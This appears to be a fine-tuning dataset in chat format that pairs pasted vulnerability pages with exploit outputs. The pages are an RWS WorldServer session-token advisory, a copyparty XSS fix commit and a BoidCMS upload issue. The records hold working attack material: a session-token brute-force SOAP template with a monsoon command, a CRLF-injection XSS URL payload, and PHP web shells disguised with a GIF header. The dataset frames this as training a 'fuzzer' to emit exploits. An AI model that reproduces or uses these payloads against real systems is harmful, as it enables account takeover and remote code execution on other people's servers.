echo \"Status Code: $req\"\nfi\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttp://seclists.org/fulldisclosure/2023/Jul/30\nFull Disclosure: [RT-SA-2023-001] Session Token Enumeration in RWS WorldServer\n\nNmap.org\nNpcap.com\nSeclists.org\nSectools.org\nInsecure.org\nFull Disclosure\nmailing list archives\n\nBy Date\nBy Thread\n[RT-SA-2023-001] Session Token Enumeration in RWS WorldServer\n\nFrom: RedTeam Pentesting GmbH <release () redteam-pentesting de>\nDate: Wed, 19 Jul 2023 09:53:20 +0200\nAdvisory: Session Token Enumeration in RWS WorldServer\n\nSession tokens in RWS WorldServer have a low entropy and can be\nenumerated, leading to unauthorised access to user sessions.\nDetails\n=======\n\nProduct: WorldServer\nAffected Versions: 11.7.3 and earlier versions\nFixed Version: 11.8.0\nVulnerability Type: Session Token Enumeration\nSecurity Risk: high\nVendor URL: https://www.rws.com/localization/products/additional-solutions/\nVendor Status: fixed version released\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-001\nAdvisory Status: published\nCVE: CVE-2023-38357\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38357\nIntroduction\n============\n\n\"WorldServer offers a flexible, enterprise-class translation management\nsystem that automates translation tasks and greatly reduces the cost of\nsupporting large volumes of local language content.\"\n\n(from the vendor's homepage)\nMore Details\n============\n\nWorldServer associates user sessions with numerical tokens, which always\nare positive values below 2^31. The SOAP action \"loginWithToken\" allows\nfor a high amount of parallel attempts to check if a token is valid.\nDuring analysis, many assigned tokens were found to be in the 7-digit\nrange of values. An attacker is therefore able to enumerate user\naccounts in only a few hours.\nProof of Concept\n================\n\nIn the following an example \"loginWithToken\" request is shown:\n\n-----------------------------------------------------------------------\nPOST /ws/services/WSContext HTTP/1.1\nContent-Type: text/xml;charset=UTF-8\nSOAPAction: \"\"\nContent-Length: 501\nHost: www.example.com\nConnection: close\nUser-Agent: agent\n\n<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=\"http://www.w3.org/2001/XMLSchema&quot; \nxmlns:soapenv=\"http://schemas.xmlsoap.org&quot;>\n\n   <soapenv:Header/>\n   <soapenv:Body>\n      <com:loginWithToken soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/&quot;>\n         <token xsi:type=\"xsd:string\">FUZZ</token>\n      </com:loginWithToken>\n   </soapenv:Body>\n</soapenv:Envelope>\n-----------------------------------------------------------------------\n\nIt can be saved as file \"login-soap.req\" and be used as a request\ntemplate for the command-line HTTP enumerator monsoon [1] to achieve\nmany parallel requests:\n\n-----------------------------------------------------------------------\n$ monsoon fuzz --threads 100 \\\n--template-file login-soap.req \\\n--range 1-2147483647 \\\n--hide-pattern \"InvalidSessionException\" \\\n'https://www.example.com&apos;\n\nTarget URL: https://www.example.com/\n\n status   header     body   value    extract\n\n    500      191      560   5829099\n    500      191      556   6229259\n    200      191     3702   7545136\n    500      191      556   9054984\n[...]\nprocessed 12000000 HTTP requests in 2h38m38s\n4 of 12000000 requests shown, 1225 req/s\n-----------------------------------------------------------------------\n\nThe --range parameter reflects the possible value range of 2^31 and for\neach value an HTTP request is sent to the WorldServer SOAP API where the\nFUZZ marker in the request template is replaced with the respective\nvalue. Also responses are hidden which contain \"InvalidSessionException\"\nas these sessions are invalid. Responses will yield a status code of 200\nif an administrative session token is found. For an unprivileged user\nsession, status code 500 is returned.\nWorkaround\n==========\n\nLower the rate at which requests can be issued, for example with a\nfrontend proxy.\nFix\n===\n\nAccording to the vendor, upgrading to versions above 11.8.0 resolves the\nvulnerability.\nSecurity Risk\n=============\n\nAttackers can efficiently enumerate session tokens. In a penetration\ntest, it was possible to get access to multiple user accounts, including\nadministrative accounts using this method in under three hours.\nAdditionally, by using such an administrative account it seems likely to\nbe possible to execute arbitrary code on the underlying server by\ncustomising the REST API [2]. Thus, the vulnerability poses a high risk.\nTimeline\n========\n\n2023-03-27 Vulnerability identified\n2023-03-30 Customer approved disclosure to vendor\n2023-04-03 Requested security contact from vendor\n2023-04-06 Vendor responded with security contact\n2023-04-14 Advisory sent to vendor\n2023-04-18 Vendor confirms vulnerability and states that it was already\nknown and fixed in version 11.8.0.\n2023-07-03 Customer confirms update to fixed version\n2023-07-05 CVE ID requested\n2023-07-15 CVE ID assigned\n2023-07-19 Advisory released\n\nReferences\n==========\n\n[1] https://github.com/RedTeamPentesting/monsoon\n[2] https://docs.rws.com/860026/585715/worldserver-11-7-developer-documentation/customizing-the-rest-api\nRedTeam Pentesting GmbH\n=======================\n\nRedTeam Pentesting offers individual penetration tests performed by a\nteam of specialised IT-security experts. Hereby, security weaknesses in\ncompany networks or products are uncovered and can be fixed immediately.\n\nAs there are only few experts in this field, RedTeam Pentesting wants to\nshare its knowledge and enhance the public knowledge with research in\nsecurity-related areas. The results are made available as public\nsecurity advisories.\n\nMore information about RedTeam Pentesting can be found at:\nhttps://www.redteam-pentesting.de/\nWorking at RedTeam Pentesting\n=============================\n\nRedTeam Pentesting is looking for penetration testers to join our team\nin Aachen, Germany. If you are interested please visit:\nhttps://jobs.redteam-pentesting.de/\n\n--\nRedTeam Pentesting GmbH                   Tel.: +49 241 510081-0\nAlter Posthof 1                           Fax : +49 241 510081-99\n52062 Aachen                    https://www.redteam-pentesting.de\nGermany                         Registergericht: Aachen HRB 14004\nGeschäftsführer:                       Patrick Hof, Jens Liebchen\nAttachment:\nOpenPGP_signature\nDescription: OpenPGP digital signature\n_______________________________________________\nSent through the Full Disclosure mailing list\nhttps://nmap.org/mailman/listinfo/fulldisclosure\nWeb Archives & RSS: https://seclists.org/fulldisclosure/\n\nBy Date\nBy Thread\n\nCurrent thread:\n\n[RT-SA-2023-001] Session Token Enumeration in RWS WorldServer RedTeam Pentesting GmbH (Jul 19)\nNmap Security Scanner\n\nRef Guide\nInstall Guide\nDocs\nDownload\nNmap OEM\n\nNpcap packet capture\n\nUser's Guide\nAPI docs\nDownload\nNpcap OEM\n\nSecurity Lists\n\nNmap Announce\nNmap Dev\nFull Disclosure\nOpen Source Security\nBreachExchange\n\nSecurity Tools\n\nVuln scanners\nPassword audit\nWeb scanners\nWireless\nExploitation\n\nAbout\n\nAbout/Contact\nPrivacy\nAdvertising\nNmap Public Source License\n\n\n"}, {"role": "assistant", "content": "descriptionsSession tokens in RWS WorldServer 11.7.3 and earlier have a low entropy and can be enumerated, leading to unauthorized access to user sessions.\n\nexploit\n/multiple/webapps/51619.txt\nExploit Title: RWS WorldServer 11.7.3 - Session Token Enumeration\nSession tokens in RWS WorldServer have a low entropy and can be\nenumerated, leading to unauthorised access to user sessions.\n\n\nDetails\n=======\n\nProduct: WorldServer\nAffected Versions: 11.7.3 and earlier versions\nFixed Version: 11.8.0\nVulnerability Type: Session Token Enumeration\nSecurity Risk: high\nVendor URL: https://www.rws.com/localization/products/additional-solutions/\nVendor Status: fixed version released\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2023-001\nAdvisory Status: published\nCVE: CVE-2023-38357\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38357\n\n\nIntroduction\n============\n\n\"WorldServer offers a flexible, enterprise-class translation management\nsystem that automates translation tasks and greatly reduces the cost of\nsupporting large volumes of local language content.\"\n\n(from the vendor's homepage)\n\n\nMore Details\n============\n\nWorldServer associates user sessions with numerical tokens, which always\nare positive values below 2^31. The SOAP action \"loginWithToken\" allows\nfor a high amount of parallel attempts to check if a token is valid.\nDuring analysis, many assigned tokens were found to be in the 7-digit\nrange of values. An attacker is therefore able to enumerate user\naccounts in only a few hours.\n\n\nProof of Concept\n================\n\nIn the following an example \"loginWithToken\" request is shown:\n\n-----------------------------------------------------------------------\nPOST /ws/services/WSContext HTTP/1.1\nContent-Type: text/xml;charset=UTF-8\nSOAPAction: \"\"\nContent-Length: 501\nHost: www.example.com\nConnection: close\nUser-Agent: agent\n\n<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\nxmlns:soapenv=\"http://schemas.xmlsoap.org\">\n     <soapenv:Header/>\n     <soapenv:Body>\n        <com:loginWithToken soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n           <token xsi:type=\"xsd:string\">FUZZ</token>\n        </com:loginWithToken>\n     </soapenv:Body>\n</soapenv:Envelope>\n-----------------------------------------------------------------------\n\nIt can be saved as file \"login-soap.req\" and be used as a request\ntemplate for the command-line HTTP enumerator monsoon [1] to achieve\nmany parallel requests:\n\n-----------------------------------------------------------------------\n$ monsoon fuzz --threads 100 \\\n--template-file login-soap.req \\\n--range 1-2147483647 \\\n--hide-pattern \"InvalidSessionException\" \\\n'https://www.example.com'\n\nTarget URL: https://www.example.com/\n\n   status   header     body   value    extract\n\n      500      191      560   5829099\n      500      191      556   6229259\n      200      191     3702   7545136\n      500      191      556   9054984\n[...]\nprocessed 12000000 HTTP requests in 2h38m38s\n4 of 12000000 requests shown, 1225 req/s\n-----------------------------------------------------------------------\n\nThe --range parameter reflects the possible value range of 2^31 and for\neach value an HTTP request is sent to the WorldServer SOAP API where the\nFUZZ marker in the request template is replaced with the respective\nvalue. Also responses are hidden which contain \"InvalidSessionException\"\nas these sessions are invalid. Responses will yield a status code of 200\nif an administrative session token is found. For an unprivileged user\nsession, status code 500 is returned.\n\n\nWorkaround\n==========\n\nLower the rate at which requests can be issued, for example with a\nfrontend proxy.\n\n\nFix\n===\n\nAccording to the vendor, upgrading to versions above 11.8.0 resolves the\nvulnerability.\n\n\nSecurity Risk\n=============\n\nAttackers can efficiently enumerate session tokens. In a penetration\ntest, it was possible to get access to multiple user accounts, including\nadministrative accounts using this method in under three hours.\nAdditionally, by using such an administrative account it seems likely to\nbe possible to execute arbitrary code on the underlying server by\ncustomising the REST API [2]. Thus, the vulnerability poses a high risk.\n\n\nTimeline\n========\n\n2023-03-27 Vulnerability identified\n2023-03-30 Customer approved disclosure to vendor\n2023-04-03 Requested security contact from vendor\n2023-04-06 Vendor responded with security contact\n2023-04-14 Advisory sent to vendor\n2023-04-18 Vendor confirms vulnerability and states that it was already\nknown and fixed in version 11.8.0.\n2023-07-03 Customer confirms update to fixed version\n2023-07-05 CVE ID requested\n2023-07-15 CVE ID assigned\n2023-07-19 Advisory released\n\nReferences\n==========\n\n[1] https://github.com/RedTeamPentesting/monsoon\n[2] https://docs.rws.com/860026/585715/worldserver-11-7-developer-documentation/customizing-the-rest-api\n\n\nRedTeam Pentesting GmbH\n=======================\n\nRedTeam Pentesting offers individual penetration tests performed by a\nteam of specialised IT-security experts. Hereby, security weaknesses in\ncompany networks or products are uncovered and can be fixed immediately.\n\nAs there are only few experts in this field, RedTeam Pentesting wants to\nshare its knowledge and enhance the public knowledge with research in\nsecurity-related areas. The results are made available as public\nsecurity advisories.\n\nMore information about RedTeam Pentesting can be found at:\nhttps://www.redteam-pentesting.de/\n\n\nWorking at RedTeam Pentesting\n=============================\n\nRedTeam Pentesting is looking for penetration testers to join our team\nin Aachen, Germany. If you are interested please visit:\nhttps://jobs.redteam-pentesting.de/\n\n--\nRedTeam Pentesting GmbH                   Tel.: +49 241 510081-0\nAlter Posthof 1                           Fax : +49 241 510081-99\n52062 Aachen                    https://www.redteam-pentesting.de\nGermany                         Registergericht: Aachen HRB 14004\nGesch채ftsf체hrer:                       Patrick Hof, Jens Liebchen\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/9001/copyparty/commit/007d948cb982daa05bc6619cd20ee55b7e834c38\nfix GHSA-f54q-j679-p9hh: reflected-XSS in cookie-setters; · 9001/copyparty@007d948 · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        9001\n \n/\n\ncopyparty\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    26\n \n          Star\n 477\n  \nCode\n\nIssues\n8\nPull requests\n0\nDiscussions\n\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          fix GHSA-f54q-j679-p9hh: reflected-XSS in cookie-setters;\n        \n\nBrowse files\nBrowse the repository at this point in the history\n\nit was possible to set cookie values which contained newlines,\nthus terminating the http header and bleeding into the body.\n\nWe now disallow control-characters in queries,\nbut still allow them in paths, as copyparty supports\nfilenames containing newlines and other mojibake.\n\nThe changes in `set_k304` are not necessary in fixing the vulnerability,\nbut makes the behavior more correct.\n\nLoading branch information\n\n \n9001\n    \n  committed\n  Jul 23, 2023\n\n        1 parent\n          \n          335fcc8\n\ncommit 007d948\n \n Show file tree\n \n Hide file tree\n\n      Showing\n      3 changed files\n      with\n      33 additions\n      and\n      2 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n\n \n        copyparty\n      \n\ncopyparty/httpcli.py\n\n        httpcli.py\n      \ncopyparty/httpsrv.py\n\n        httpsrv.py\n      \ncopyparty/util.py\n\n        util.py\n      \n\n \n        There are no files selected for viewing\n\n \n\n            31 changes: 29 additions & 2 deletions\n          \n31 \n\ncopyparty/httpcli.py\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -337,6 +337,15 @@ def run(self) -> bool:\n\n vpath, arglist = self.req.split(\"?\", 1)\n\n self.trailing_slash = vpath.endswith(\"/\")\n\n vpath = undot(vpath)\n\n zs = unquotep(arglist)\n\n m = self.conn.hsrv.ptn_cc.search(zs)\n\n if m:\n\n hit = zs[m.span()[0] :]\n\n t = \"malicious user; Cc in query [{}] => [{!r}]\"\n\n self.log(t.format(self.req, hit), 1)\n\n return False\n\n for k in arglist.split(\"&\"):\n\n if \"=\" in k:\n\n k, zs = k.split(\"=\", 1)\nExpand Down\n\nExpand Up\n\n@@ -488,6 +497,9 @@ def run(self) -> bool:\n\n pex: Pebkac = ex # type: ignore\n\n try:\n\n if pex.code == 999:\n\n return False\n\n post = self.mode in [\"POST\", \"PUT\"] or \"content-length\" in self.headers\n\n if not self._check_nonfatal(pex, post):\n\n self.keepalive = False\nExpand Down\n\nExpand Up\n\n@@ -586,6 +598,14 @@ def send_headers(\n\n for k, zs in list(self.out_headers.items()) + self.out_headerlist:\n\n response.append(\"%s: %s\" % (k, zs))\n\n for zs in response:\n\n m = self.conn.hsrv.ptn_cc.search(zs)\n\n if m:\n\n hit = zs[m.span()[0] :]\n\n t = \"malicious user; Cc in out-hdr {!r} => [{!r}]\"\n\n self.log(t.format(zs, hit), 1)\n\n raise Pebkac(999)\n\n try:\n\n # best practice to separate headers and body into different packets\n\n self.s.sendall(\"\\r\\n\".join(response).encode(\"utf-8\") + b\"\\r\\n\\r\\n\")\nExpand Down\n\nExpand Up\n\n@@ -785,7 +805,7 @@ def handle_get(self) -> bool:\n\n path_base = os.path.join(self.E.mod, \"web\")\n\n static_path = absreal(os.path.join(path_base, self.vpath[5:]))\n\n if not static_path.startswith(path_base):\n\n t = \"attempted path traversal [{}] => [{}]\"\n\n t = \"malicious user; attempted path traversal [{}] => [{}]\"\n\n self.log(t.format(self.vpath, static_path), 1)\n\n self.tx_404()\n\n return False\nExpand Down\n\nExpand Up\n\n@@ -3077,7 +3097,14 @@ def tx_mounts(self) -> bool:\n\n return True\n\n def set_k304(self) -> bool:\n\n ck = gencookie(\"k304\", self.uparam[\"k304\"], self.args.R, False, 86400 * 299)\n\n v = self.uparam[\"k304\"].lower()\n\n if v == \"y\":\n\n dur = 86400 * 299\n\n else:\n\n dur = None\n\n v = \"x\"\n\n ck = gencookie(\"k304\", v, self.args.R, False, dur)\n\n self.out_headerlist.append((\"Set-Cookie\", ck))\n\n self.redirect(\"\", \"?h#cc\")\n\n return True\nExpand Down\n            3 changes: 3 additions & 0 deletions\n          \n3 \n\ncopyparty/httpsrv.py\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -4,6 +4,7 @@\n\nimport base64\n\nimport math\n\nimport os\n\nimport re\n\nimport socket\n\nimport sys\n\nimport threading\nExpand Down\n\nExpand Up\n\n@@ -138,6 +139,8 @@ def __init__(self, broker: \"BrokerCli\", nid: Optional[int]) -> None:\n\n zs = os.path.join(self.E.mod, \"web\", \"deps\", \"prism.js.gz\")\n\n self.prism = os.path.exists(zs)\n\n self.ptn_cc = re.compile(r\"[\\x00-\\x1f]\")\n\n self.mallow = \"GET HEAD POST PUT DELETE OPTIONS\".split()\n\n if not self.args.no_dav:\n\n zs = \"PROPFIND PROPPATCH LOCK UNLOCK MKCOL COPY MOVE\"\nExpand Down\n            1 change: 1 addition & 0 deletions\n          \n1 \n\ncopyparty/util.py\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -171,6 +171,7 @@ def sunpack(fmt: bytes, a: bytes) -> tuple[Any, ...]:\n\n 500: \"Internal Server Error\",\n\n 501: \"Not Implemented\",\n\n 503: \"Service Unavailable\",\n\n 999: \"MissingNo\",\n\n}\nExpand Down\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit 007d948\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionscopyparty is file server software. Prior to version 1.8.7, the application contains a reflected cross-site scripting via URL-parameter `?k304=...` and `?setck=...`. The worst-case outcome of this is being able to move or delete existing files on the server, or upload new files, using the account of the person who clicks the malicious link. It is recommended to change the passwords of one's copyparty accounts, unless one have inspected one's logs and found no trace of attacks. Version 1.8.7 contains a patch for the issue.\n\nexploit\n/python/webapps/51635.txt\n# Exploit Title: copyparty v1.8.6 - Reflected Cross Site Scripting (XSS)\n# Date: 23/07/2023\n# Exploit Author: Vartamtezidis Theodoros (@TheHackyDog)\n# Vendor Homepage: https://github.com/9001/copyparty/\n# Software Link: https://github.com/9001/copyparty/releases/tag/v1.8.6\n# Version: <=1.8.6\n# Tested on: Debian Linux\n# CVE : CVE-2023-38501\n\n\n\n#Description\nCopyparty is a portable file server. Versions prior to 1.8.6 are subject to a reflected cross-site scripting (XSS) Attack.\n\nVulnerability that exists in the web interface of the application could allow an attacker to execute malicious javascript code by tricking users into accessing a malicious link.\n\n#POC\nhttps://localhost:3923/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/BoidCMS/BoidCMS/issues/27\n[VULNERABILITY] Authenticated file upload vulnerability  - [leading to shell command execution] · Issue #27 · BoidCMS/BoidCMS · GitHub\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        BoidCMS\n \n/\n\nBoidCMS\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    5\n \n          Star\n 43\n  \nCode\n\nIssues\n0\nPull requests\n0\nDiscussions\n\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\n    \n    New issue\n  \n\n \n \n\nHave a question about this project? Sign up for a free GitHub account to open an issue and contact its maintainers and the community.\n  \n\n    Sign up for GitHub\nBy clicking “Sign up for GitHub”, you agree to our terms of service and\n  privacy statement. We’ll occasionally send you account related emails.\n\n    Already on GitHub?\n    Sign in\n    to your account\n  \n\nJump to bottom\n\n[VULNERABILITY] Authenticated file upload vulnerability  - [leading to shell command execution]\n#27\n\n  Closed\n\n1337kid  opened this issue\nJul 13, 2023\n· 9 comments\n · Fixed by #28\n  Closed\n\n    [VULNERABILITY] Authenticated file upload vulnerability  - [leading to shell command execution]\n  \n#27\n1337kid  opened this issue\nJul 13, 2023\n· 9 comments\n · Fixed by #28\n\nAssignees\n\n \nLabels\nbug\n\nSomething isn't working\n\ndev branch\n\nAvailable in the development branch (ready for testing and review)\n\nfixed\n\nThis issue has been resolved\n\nhelp wanted\n\nExtra attention is needed\n\nhigh priority\n\nThe issue or pull request requires immediate attention\n\nin progress\n\nWork is currently underway on the issue or pull request\n\n Comments\n\n \n      \n            Copy link\n\n \n \n\n1337kid\n      \n\n      commented\n        Jul 13, 2023\n\nOverview\nBy default, an authenticated user cannot upload a PHP file due to mime type checks but it can be bypassed by adding a GIF header at the beginning of the PHP file. \"finfo\" considers a PHP file with GIF header as a GIF file instead of PHP.\n// shell.php\nGIF89a;\n<?php system($_GET[\"cmd\"]); ?>\nThe above PHP code can be uploaded, bypassing mime type checks.\n\nCommand execution\n\nPossible fix\nAdd a file extension checking mechanism to prevent upload of PHP file ..etc\n\n              The text was updated successfully, but these errors were encountered:\n            \n\n \nAll reactions\n\n \n\nshoaiyb\n          added\n      \n\n  bug\n\nSomething isn't working\n\n  help wanted\n\nExtra attention is needed\n\n  labels\n    Jul 14, 2023\n\n \n      \n            Copy link\n\n \n \nCollaborator\n\nshoaiyb\n      \n\n      commented\n        Jul 14, 2023\n\nHey there,\nThanks for reaching out and bringing this issue to my attention.\nThis issue initially seemed like a self-attack to me when I was first writing the code, but now I am convinced that an innocent authenticated user could potentially upload the file.\nI have identified two to three possible ways to reproduce this issue, including using .htaccess, the PHP runtime configuration, and the file extension checking.\nI have tested all these methods, and they all worked for me. However, I'm unsure about the best approach or whether they will work on every installation.\n\nThe extension checking mechanism will prevent any type of file without extension from being uploaded, including text files. The file extension will be the same as the file name if it has no extension. So, unless the file name is in the list of whitelisted extensions, it will never be uploaded.\n$extension = explode( '.', $basename );\n$extension = strtolower( end( $extension ) );\n$extensions = $this->_l( 'media_extension',\n  array(\n    // Extensions whitelist\n  )\n);\nif ( ! in_array( $extension, $extensions ) ) {\n  $msg = 'File extension not allowed';\n  return false;\n}\nHowever, I have considered files without extensions and thought about checking if a file is a plain text file and allowing the upload that way.\n$extension = explode( '.', $basename );\n$extension = strtolower( end( $extension ) );\n$extensions = $this->_l( 'media_extension',\n  array(\n    // Extensions whitelist\n  )\n);\nif ( ! in_array( $extension, $extensions ) ) {\n  if ( $extension !== $basename || 'text/plain' !== $type ) {\n    $msg = 'File extension not allowed';\n    return false;\n  }\n}\n\nDisabling script execution using .htaccess is more of a blacklisting approach rather than whitelisting, so there is no guarantee that the blacklisted scripts are the only scripts that can be uploaded.\nAddHandler cgi-script .php .pl .jsp .asp .sh .cgi\nOptions -ExecCGI\n\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \nshoaiyb\n          added\n      \n\n  high priority\n\nThe issue or pull request requires immediate attention\n\n  in progress\n\nWork is currently underway on the issue or pull request\n\n  labels\n    Jul 14, 2023\n\n \n      \n            Copy link\n\n \n \nAuthor\n\n1337kid\n      \n\n      commented\n        Jul 14, 2023\n\nThe one with extension whitelist looks fine. If the user indeed wants to upload codes, an extension changing mechanism can be induced. For example: script.php to script.php.txt or script_php.txt\n 👍\n1\n shoaiyb reacted with thumbs up emoji\n \nAll reactions\n👍\n1 reaction\n\n    Sorry, something went wrong.\n  \n\n \n\n \n      \n            Copy link\n\n \n \nCollaborator\n\nshoaiyb\n      \n\n      commented\n        Jul 14, 2023\nThe one with extension whitelist looks fine. If the user indeed wants to upload codes, an extension changing mechanism can be induced. For example: script.php to script.php.txt or script_php.txt\n\nDo you agree with the \"checking if a file is a plain text file and allowing the upload\" way?\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \n\n \n      \n            Copy link\n\n \n \nAuthor\n\n1337kid\n      \n\n      commented\n        Jul 14, 2023\n\nYes, I agree with that. It's a good idea.\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \n\n \n      \n            Copy link\n\n \n \nCollaborator\n\nshoaiyb\n      \n\n      commented\n        Jul 14, 2023\n\n•\n          edited\n          \n        \n\nYes, I agree with that. It's a good idea.\n\nGood 👍\nThe fix will soon be at the develop branch for additional testing.\nOne more thing, can you please take a look and see if any of the default allowed MIME types should be removed?\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \n\n \n      \n            Copy link\n\n \n \nAuthor\n\n1337kid\n      \n\n      commented\n        Jul 14, 2023\n\nAlright 👍\nLemme check the mime types\n \nAll reactions\n\n    Sorry, something went wrong.\n  \n\n \n\n \n      \n            Copy link\n\n \n \nAuthor\n\n1337kid\n      \n\n      commented\n        Jul 14, 2023\n\n•\n          edited\n          \n        \n\nOne more thing, can you please take a look and see if any of the default allowed MIME types should be removed?\n\nA PHP file with random bytes on the first line will get uploaded.\nexample:\n// file.php\nasdfghj34567yhjndtetstetlhbkERFVj65678;\n<?php system($_GET['cmd']); ?>\nThis file will bypass mime type checks. I think this file is categorized as application/octet-stream by finfo due to random data at the beginning.\nBtw, there is no point in removing application/octet-stream . Any file with random data will be considered as application/octet-stream and file need not be an executable. Adding an extension whitelist is the better choice.\n 👍\n1\n shoaiyb reacted with thumbs up emoji\n 